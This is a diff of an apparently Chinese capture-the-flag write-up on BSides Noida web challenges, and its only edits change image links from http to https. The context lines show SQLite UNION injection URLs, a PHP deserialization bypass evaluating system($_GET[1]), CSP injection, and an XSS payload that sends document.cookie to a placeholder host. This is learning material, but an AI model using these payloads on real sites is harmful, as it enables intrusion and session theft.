@@ -31,11 +31,11 @@ toc: true
 
 输入框中可以输入数字，可以看到通过 $_GET 进行传入，很典型的 SQL 注入场景。
 
-![image-20210809135357316](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809135357316.png)
+![image-20210809135357316](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809135357316.png)
 
 我们看一下源码，里面给出了 Dockerfile。
 
-![image-20210809135505307](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809135505307.png)
+![image-20210809135505307](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809135505307.png)
 
 主要的代码逻辑在于 index.php。
 
@@ -74,7 +74,7 @@ if (!$db) {
 
 很典型的 SQL 注入。但是事情并没有那么简单。尝试输入任何非数字字符时都会跳转到 error.html。
 
-![image-20210809135714044](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809135714044.png)
+![image-20210809135714044](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809135714044.png)
 
 显然有waf，但是没有别的 php 文件，查看 config 下的 ctf.conf 后发现了过滤手段。
 
@@ -154,7 +154,7 @@ http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select
 http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/tbl_name/**/from/**/sqlite_master/**/limit/**/2,1),4,5,6
 ```
 
-![image-20210809143253279](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143253279.png)
+![image-20210809143253279](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143253279.png)
 
 得到 flagss 表。然后查询字段。
 
@@ -162,7 +162,7 @@ http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select
 http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/sql/**/from/**/sqlite_master/**/limit/**/2,1),4,5,6
 ```
 
-![image-20210809143447236](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143447236.png)
+![image-20210809143447236](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143447236.png)
 
 所以实际上前面不查询表名也可以。这里一样会回显出来。
 
@@ -170,13 +170,13 @@ http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select
 http://ctf.babyweb.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/flag/**/from/**/flagsss),4,5,6
 ```
 
-![image-20210809143558681](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143558681.png)
+![image-20210809143558681](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143558681.png)
 
 
 
 这道题也有非预期，直接访问 karma.db 既可得到 flag 。。
 
-![image-20210809162421050](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162421050.png)
+![image-20210809162421050](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162421050.png)
 
 ## Web2 wowooo
 
@@ -214,7 +214,7 @@ if (!isset($_GET['debug'])) {
 flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";i:1;s:19:"V13tN4m_number_one ";}}}
 ```
 
-![image-20210809143840587](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143840587.png)
+![image-20210809143840587](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809143840587.png)
 
 
 
@@ -305,7 +305,7 @@ echo urlencode(serialize($a));
 
 这样，引号与字母中间有一个 % ，就可以绕过了。本地是成功的，但是远程不成功。问题出在 check函数上。给的注释是：`//check nullbytes`。
 
-![image-20210809150857060](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809150857060.png)
+![image-20210809150857060](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809150857060.png)
 
 
 
@@ -326,7 +326,7 @@ $a = new BSides();
 echo urlencode(serialize($a));
 ```
 
-![image-20210809151137509](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809151137509.png)
+![image-20210809151137509](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809151137509.png)
 
 
 
@@ -336,13 +336,13 @@ eval(urldecode("%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%31%5d%29%3b")) # system(
 
 在 /home 目录下找到 flag 文件。
 
-![image-20210809151726088](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809151726088.png)
+![image-20210809151726088](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809151726088.png)
 
 ## Web4 Basic Notepad
 
 注册并登陆进去之后是一个留言板，肯定是考xss了。
 
-![image-20210809152433905](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809152433905.png)
+![image-20210809152433905](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809152433905.png)
 
 
 
@@ -350,25 +350,25 @@ eval(urldecode("%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%31%5d%29%3b")) # system(
 
 抓包可以看到有个 msg 参数。cookie 里有个 auth。
 
-![image-20210809152402455](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809152402455.png)
+![image-20210809152402455](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809152402455.png)
 
 
 
 点击下方的 share with admin 估计就能把内容发送给管理员。
 
-![image-20210809152529819](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809152529819.png)
+![image-20210809152529819](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809152529819.png)
 
 插入一些 js 代码。
 
-![image-20210809154321598](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809154321598.png)
+![image-20210809154321598](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809154321598.png)
 
 但是是执行不了的。
 
-![image-20210809154620275](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809154620275.png)
+![image-20210809154620275](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809154620275.png)
 
 抓包可以看到参数 token
 
-![image-20210809204000548](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809204000548.png)
+![image-20210809204000548](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809204000548.png)
 
 
 
@@ -380,13 +380,13 @@ Content-Security-Policy: script-src 'none'; object-src 'none'; base-uri 'none'; 
 
 但是我们看到 token 是拼接到了 CSP中。
 
-![image-20210809204517851](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809204517851.png)
+![image-20210809204517851](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809204517851.png)
 
 所以我们可以控制 CSP。
 
 在 token 末尾 加入 `; script-src-attr 'unsafe-inline'`
 
-![image-20210809204628944](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809204628944.png)
+![image-20210809204628944](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809204628944.png)
 
 下面就可以使用 window.location 进行绕过了。
 
@@ -398,7 +398,7 @@ Content-Security-Policy: script-src 'none'; object-src 'none'; base-uri 'none'; 
 
 在 token 处加入 url 编码的 `; script-src-attr 'unsafe-inline'`。
 
-![image-20210810121350236](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210810121350236.png)
+![image-20210810121350236](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210810121350236.png)
 
 下面就可以拿 cookie 了。
 
@@ -406,7 +406,7 @@ Content-Security-Policy: script-src 'none'; object-src 'none'; base-uri 'none'; 
 <img src=# onerror='fetch("http://xxxx:8000/?cookie=" + encodeURI(document.cookie))'>
 ```
 
-![image-20210810121729367](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210810121729367.png)
+![image-20210810121729367](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210810121729367.png)
 
 拿到 cookie ：`YWRtaW46djNyeTUzY3IzdFA0c3N3MHJkZGRk`
 
@@ -414,7 +414,7 @@ Content-Security-Policy: script-src 'none'; object-src 'none'; base-uri 'none'; 
 
 修改 cookie 后进入。
 
-![image-20210810121958596](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210810121958596.png)
+![image-20210810121958596](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210810121958596.png)
 
 
 
@@ -430,13 +430,13 @@ sqlite 注入 nginx waf 好像和上一个一样？？？只是换了一下表�
 http://ctf.babywebrevenge.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/sql/**/from/**/sqlite_master/**/limit/**/1,1),4,5,6
 ```
 
-![image-20210809162553964](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162553964.png)
+![image-20210809162553964](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162553964.png)
 
 ```
 http://ctf.babywebrevenge.bsidesnoida.in/?chall[id=-1/**/union/**/select/**/1,2,(select/**/flag/**/from/**/therealflags),4,5,6
 ```
 
-![image-20210809162638867](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162638867.png)
+![image-20210809162638867](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162638867.png)
 
 
 
@@ -472,11 +472,11 @@ if (isset($_POST['VietNam'])) {
 
 加上参数 check 可以查看 phpinfo，几乎把所有的函数都给过滤了，经过 fuzz 后发现没有过滤 exec。
 
-![image-20210809163006394](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809163006394.png)
+![image-20210809163006394](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809163006394.png)
 
 访问 config.php 可以看到提示：
 
-![image-20210809162810614](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162810614.png)
+![image-20210809162810614](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809162810614.png)
 
 
 
@@ -521,7 +521,7 @@ url 编码后传入。
 
 但是触发了 `strlen($VN) > 110`。
 
-![image-20210809165321105](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809165321105.png)
+![image-20210809165321105](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809165321105.png)
 
 
 
@@ -557,7 +557,7 @@ $_=C;$_++;$C=++$_;$_++;$_++;$C_=$_;$_=(C/C.C)[0];$_++;$_++;$_++;$_++;$_++;$_=_.$
 
 记得url编码。
 
-![image-20210809222814196](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809222814196.png)
+![image-20210809222814196](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210809222814196.png)
 
 
 
